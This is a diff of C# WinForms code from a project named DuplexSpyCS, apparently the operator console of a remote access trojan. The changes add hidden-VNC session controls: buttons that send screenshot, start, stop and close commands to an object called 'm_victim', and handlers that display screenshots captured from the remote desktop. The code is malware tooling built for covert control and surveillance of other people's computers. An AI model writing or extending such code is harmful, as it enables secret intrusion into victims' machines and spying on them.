@@ -7,6 +7,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static System.Collections.Specialized.BitVector32;
 
 namespace DuplexSpyCS
 {
@@ -42,7 +43,52 @@ namespace DuplexSpyCS
             public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName); } }
         }
 
-        private stHvncSession fnGetSession(TabPage page) => page == null ? new stHvncSession() : (stHvncSession)page.Tag;
+        public struct stToolStripControls
+        {
+            private TabPage Page { get; init; }
+            public bool bIsNull { get { return Page == null || btnStart == null || pictureBox == null; } }
+
+            public ToolStripButton? btnScreenshot = null;
+            public ToolStripButton? btnStart = null;
+            public ToolStripButton? btnStop = null;
+            public ToolStripButton? btnClose = null;
+
+            public ToolStripComboBox? comboDelay = null;
+
+            public ToolStripButton? btnMouse = null;
+            public ToolStripButton? btnKeyboard = null;
+            public ToolStripButton? btnFPS = null;
+            public ToolStripButton? btnTs = null;
+
+            public PictureBox? pictureBox = null;
+
+            public stToolStripControls(TabPage page)
+            {
+                Page = page;
+
+                if (page == null)
+                    return;
+
+                ToolStrip ts = (ToolStrip)page.Controls[0];
+
+                btnScreenshot = (ToolStripButton)ts.Items[0];
+                btnStart = (ToolStripButton)ts.Items[1];
+                btnStop = (ToolStripButton)ts.Items[2];
+                btnClose = (ToolStripButton)ts.Items[3];
+
+                comboDelay = (ToolStripComboBox)ts.Items[6];
+
+                btnMouse = (ToolStripButton)ts.Items[8];
+                btnKeyboard = (ToolStripButton)ts.Items[9];
+                btnFPS = (ToolStripButton)ts.Items[10];
+                btnTs = (ToolStripButton)ts.Items[11];
+
+                PictureBox pb = (PictureBox)page.Controls[1];
+                pictureBox = pb;
+            }
+        }
+
+        private stHvncSession fnGetSession(TabPage page) => page == null || page.Tag == null ? new stHvncSession() : (stHvncSession)page.Tag;
         private stHvncSession fnGetSession(string szName)
         {
             foreach (TabPage page in tabControl1.TabPages)
@@ -96,10 +142,54 @@ namespace DuplexSpyCS
                                 toolStripStatusLabel1.Text = $"Action successfully. Desktop[{treeView1.Nodes.Count}]";
                             });
                         }
+                        else if (lsMsg[2] == "sc")
+                        {
+                            // Screenshot
+
+                            string szDesktopName = lsMsg[3];
+                            int nCode = int.Parse(lsMsg[4]);
+
+                            if (nCode == 0)
+                            {
+                                MessageBox.Show(lsMsg[5]);
+                                return;
+                            }
+
+                            string szB64 = lsMsg[5];
+                            DateTime dt = DateTime.Parse(lsMsg[6]);
+
+                            Bitmap bmp = (Bitmap)clsTools.Base64ToImage(szB64);
+                            if (bmp == null)
+                                return;
+
+                            Invoke(() =>
+                            {
+                                var session = fnGetSession(szDesktopName);
+                                if (session.bIsNull)
+                                    return;
+
+                                TabPage page = session.page;
+                                if (page == null)
+                                    return;
+
+                                var control = new stToolStripControls(page);
+                                if (control.bIsNull || control.pictureBox == null)
+                                    return;
+
+                                control.pictureBox.Image = bmp;
+                            });
+                        }
                         else if (lsMsg[2] == "start")
                         {
                             // Start HVNC
+                            string szName = lsMsg[3];
+                            string szExeFile = lsMsg[4];
+                            int nCode = int.Parse(lsMsg[5]);
 
+                            if (nCode == 1)
+                            {
+                                MessageBox.Show("Start HVNC session successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            }
                         }
                         else if (lsMsg[2] == "stop")
                         {
@@ -148,7 +238,7 @@ namespace DuplexSpyCS
                     return p;
             }
 
-            TabPage page = new TabPage();
+            TabPage page = new TabPage($"{session.szDesktopName}");
 
             if (bShow)
                 tabControl1.TabPages.Add(page);
@@ -157,25 +247,88 @@ namespace DuplexSpyCS
             session.page = page;
 
             /* Layout:
-             *      | [Start] [Stop] [Close] | Delay: [Combobox(miliseconds)] | [Mouse] [Keyboard] [FPS] [Timestamp] |
+             *      | [Shot] [Start] [Stop] [Close] | Delay: [Combobox(miliseconds)] | [Mouse] [Keyboard] [FPS] [Timestamp] |
              */
+
+            ToolStripButton btnScreenshot = new ToolStripButton("Shot");
+            btnScreenshot.Click += (s, e) =>
+            {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
+
+                var session = fnGetSession(page);
+                if (session.bIsNull)
+                {
+                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "hvnc",
+                    "window",
+                    "sc",
+                    session.szDesktopName,
+                    session.szExeFilePath,
+                });
+            };
 
             ToolStripButton btnStart = new ToolStripButton("Start");
             btnStart.Click += (s, e) =>
             {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
 
+                var session = fnGetSession(page);
+                if (session.bIsNull)
+                {
+                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                var control = new stToolStripControls(page);
+                if (control.bIsNull || control.comboDelay == null)
+                    return;
+
+                int nDelay = int.Parse(control.comboDelay.Text);
+
+                fnSessionStart(session, nDelay);
             };
 
             ToolStripButton btnStop = new ToolStripButton("Stop");
             btnStop.Click += (s, e) =>
             {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
 
+                var session = fnGetSession(page);
+                if (session.bIsNull)
+                {
+                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                fnSessionStop(session);
             };
 
             ToolStripButton btnClose = new ToolStripButton("Close");
             btnClose.Click += (s, e) =>
             {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
 
+                var session = fnGetSession(page);
+                if (session.bIsNull)
+                {
+                    MessageBox.Show("Session is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                fnSessionClose(session);
             };
 
             ToolStripComboBox coboxDelay = new ToolStripComboBox();
@@ -214,6 +367,7 @@ namespace DuplexSpyCS
             ToolStrip ts = new ToolStrip();
             ts.Items.AddRange(new ToolStripItem[]
             {
+                btnScreenshot,
                 btnStart,
                 btnStop,
                 btnClose,
@@ -233,11 +387,13 @@ namespace DuplexSpyCS
 
             page.Controls.Add(ts);
             ts.Dock = DockStyle.Top;
+            ts.Font = Font;
 
             PictureBox pb = new PictureBox();
             page.Controls.Add(pb);
             pb.Dock = DockStyle.Fill;
             pb.SizeMode = PictureBoxSizeMode.Zoom;
+            pb.BackColor = Color.Gray;
 
             return page;
         }
@@ -260,6 +416,42 @@ namespace DuplexSpyCS
             node.Nodes.Add(nodeApp);
 
             return nodeApp;
+        }
+
+        void fnSessionStart(stHvncSession session, int nDelay = 100)
+        {
+            m_victim.fnSendCommand(new string[]
+            {
+                "hvnc",
+                "window",
+                "start",
+
+                session.szDesktopName,
+                session.szExeFilePath,
+                nDelay.ToString(),
+            });
+        }
+
+        void fnSessionStop(stHvncSession session)
+        {
+            m_victim.fnSendCommand(new string[]
+            {
+                "hvnc",
+                "window",
+                "stop",
+                session.szDesktopName,
+            });
+        }
+
+        void fnSessionClose(stHvncSession session)
+        {
+            m_victim.fnSendCommand(new string[]
+            {
+                "hvnc",
+                "window",
+                "close",
+                session.szDesktopName,
+            });
         }
 
         void fnSetup()
@@ -352,6 +544,27 @@ namespace DuplexSpyCS
 
             TreeNode node = fnAddSession(session);
             treeView1.SelectedNode = node;
+
+            DialogResult dr = MessageBox.Show("Session is added, do you want to start it now?", "Start session", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+            if (dr == DialogResult.Yes)
+            {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                {
+                    MessageBox.Show("Tabpage is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                var controls = new stToolStripControls(page);
+                if (controls.bIsNull || controls.comboDelay == null)
+                {
+                    MessageBox.Show("Structure init failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                int nDelay = int.Parse(controls.comboDelay.Text);
+                fnSessionStart(session, nDelay);
+            }
         }
 
         // Close
@@ -369,7 +582,23 @@ namespace DuplexSpyCS
         // Start
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
         {
+            TabPage page = tabControl1.SelectedTab;
+            if (page == null)
+            {
+                MessageBox.Show("Tabpage is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
 
+            var controls = new stToolStripControls(page);
+            var session = fnGetSession(page);
+            if (controls.bIsNull || controls.comboDelay == null || session.bIsNull)
+            {
+                MessageBox.Show("Structure init failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int nDelay = int.Parse(controls.comboDelay.Text);
+            fnSessionStart(session, nDelay);
         }
 
         // Start All
